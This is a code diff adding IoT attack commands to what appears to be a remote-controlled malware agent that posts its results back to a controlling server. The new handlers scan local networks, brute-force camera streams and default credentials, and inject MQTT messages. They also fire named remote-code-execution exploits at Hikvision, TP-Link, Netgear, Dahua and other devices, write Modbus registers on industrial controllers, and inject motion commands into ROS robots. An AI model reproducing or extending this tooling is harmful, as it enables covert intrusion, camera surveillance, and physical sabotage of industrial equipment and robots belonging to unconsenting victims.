@@ -2343,6 +2343,131 @@ $filter='(&(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=41
                     out = f"WIFI_DEAUTH error: {e}"
                 _post(f"/agent/result?id={AID}&cmd=WIFI_DEAUTH", str(out)[:2000])
 
+            elif cmd == "IOT_SCAN":
+                # IOT_SCAN — scan local /24 for IoT devices
+                try:
+                    import sys as _sys2; _sys2.path.insert(0, _MOD_DIR)
+                    import iot_attack as _iot
+                    subnet = ".".join(_get_local_ip().split(".")[:3]) + ".0/24"
+                    devs = _iot.scan_subnet(subnet, threads=32)
+                    lines = [f"{d['ip']} {d['device_type']} ports={d['open_ports']}" for d in devs]
+                    out = "\n".join(lines) if lines else "No IoT devices found"
+                except Exception as e:
+                    out = f"IOT_SCAN error: {e}"
+                _post(f"/agent/result?id={AID}&cmd=IOT_SCAN", str(out)[:8000])
+
+            elif cmd and cmd.startswith("IOT_AUTO"):
+                # IOT_AUTO [subnet]
+                try:
+                    parts = cmd.split()
+                    import sys as _sys2; _sys2.path.insert(0, _MOD_DIR)
+                    import iot_attack as _iot, threading as _thr
+                    subnet = parts[1] if len(parts) > 1 else \
+                        ".".join(_get_local_ip().split(".")[:3]) + ".0/24"
+                    _thr.Thread(target=_iot.auto_attack,
+                                kwargs={"subnet": subnet}, daemon=True).start()
+                    out = f"IoT auto-attack started on {subnet}"
+                except Exception as e:
+                    out = f"IOT_AUTO error: {e}"
+                _post(f"/agent/result?id={AID}&cmd=IOT_AUTO", str(out)[:3000])
+
+            elif cmd and cmd.startswith("IOT_CAM "):
+                # IOT_CAM <ip> — RTSP brute + snapshot
+                try:
+                    parts = cmd.split()
+                    target = parts[1]
+                    import sys as _sys2; _sys2.path.insert(0, _MOD_DIR)
+                    import iot_attack as _iot
+                    streams = _iot.rtsp_brute(target)
+                    if streams:
+                        snap = _iot.capture_rtsp_snapshot(streams[0])
+                        out = f"Streams: {streams}\nSnapshot: {snap}"
+                    else:
+                        cred = _iot.camera_default_creds(target)
+                        out = f"No RTSP streams. HTTP creds: {cred}"
+                except Exception as e:
+                    out = f"IOT_CAM error: {e}"
+                _post(f"/agent/result?id={AID}&cmd=IOT_CAM", str(out)[:5000])
+
+            elif cmd and cmd.startswith("IOT_MQTT "):
+                # IOT_MQTT <ip> [topic] [payload]
+                try:
+                    parts = cmd.split(None, 3)
+                    target = parts[1]
+                    topic   = parts[2] if len(parts) > 2 else "#"
+                    payload = parts[3] if len(parts) > 3 else None
+                    import sys as _sys2; _sys2.path.insert(0, _MOD_DIR)
+                    import iot_attack as _iot
+                    if payload:
+                        _iot.mqtt_inject(target, topic=topic, payload=payload)
+                        out = f"MQTT injected {topic}={payload}"
+                    else:
+                        out = _iot.mqtt_dump_topics(target, duration=20) or "No messages"
+                except Exception as e:
+                    out = f"IOT_MQTT error: {e}"
+                _post(f"/agent/result?id={AID}&cmd=IOT_MQTT", str(out)[:5000])
+
+            elif cmd and cmd.startswith("IOT_CVE "):
+                # IOT_CVE <cve_name> <ip>
+                try:
+                    parts = cmd.split()
+                    cve_name = parts[1]
+                    target   = parts[2] if len(parts) > 2 else None
+                    import sys as _sys2; _sys2.path.insert(0, _MOD_DIR)
+                    import iot_attack as _iot
+                    fn = {
+                        "hikvision": _iot.cve_hikvision_rce,
+                        "tplink":    _iot.cve_tplink_rce,
+                        "tenda":     _iot.cve_tenda_rce,
+                        "netgear":   _iot.cve_netgear_rce,
+                        "axis":      _iot.cve_axis_rce,
+                        "dahua":     _iot.cve_dahua_auth_bypass,
+                        "geutebruck":_iot.cve_geutebruck_rce,
+                    }.get(cve_name.lower())
+                    if fn and target:
+                        result = fn(target)
+                        out = f"CVE {cve_name} on {target}: {'success' if result else 'failed'}"
+                    else:
+                        out = f"Unknown CVE '{cve_name}' or no target. Options: hikvision tplink tenda netgear axis dahua geutebruck"
+                except Exception as e:
+                    out = f"IOT_CVE error: {e}"
+                _post(f"/agent/result?id={AID}&cmd=IOT_CVE", str(out)[:3000])
+
+            elif cmd and cmd.startswith("IOT_MODBUS "):
+                # IOT_MODBUS <ip> [write <reg> <val>]
+                try:
+                    parts = cmd.split()
+                    target = parts[1]
+                    import sys as _sys2; _sys2.path.insert(0, _MOD_DIR)
+                    import iot_attack as _iot
+                    if len(parts) >= 5 and parts[2] == "write":
+                        _iot.modbus_write(target, int(parts[3]), int(parts[4]))
+                        out = f"Modbus write reg={parts[3]} val={parts[4]}"
+                    else:
+                        regs = _iot.modbus_scan(target)
+                        out = f"Modbus registers: {regs}"
+                except Exception as e:
+                    out = f"IOT_MODBUS error: {e}"
+                _post(f"/agent/result?id={AID}&cmd=IOT_MODBUS", str(out)[:3000])
+
+            elif cmd and cmd.startswith("IOT_ROS "):
+                # IOT_ROS <ip> [inject <linear> <angular>]
+                try:
+                    parts = cmd.split()
+                    target = parts[1]
+                    import sys as _sys2; _sys2.path.insert(0, _MOD_DIR)
+                    import iot_attack as _iot
+                    if len(parts) >= 5 and parts[2] == "inject":
+                        _iot.ros_inject_velocity(target,
+                            linear_x=float(parts[3]), angular_z=float(parts[4]))
+                        out = f"ROS velocity injected: linear={parts[3]} angular={parts[4]}"
+                    else:
+                        result = _iot.ros_scan(target)
+                        out = str(result)[:2000] if result else "ROS master not found"
+                except Exception as e:
+                    out = f"IOT_ROS error: {e}"
+                _post(f"/agent/result?id={AID}&cmd=IOT_ROS", str(out)[:3000])
+
             elif cmd and cmd.startswith("WIFI_EVIL_TWIN "):
                 # WIFI_EVIL_TWIN <ssid> [channel]
                 try:
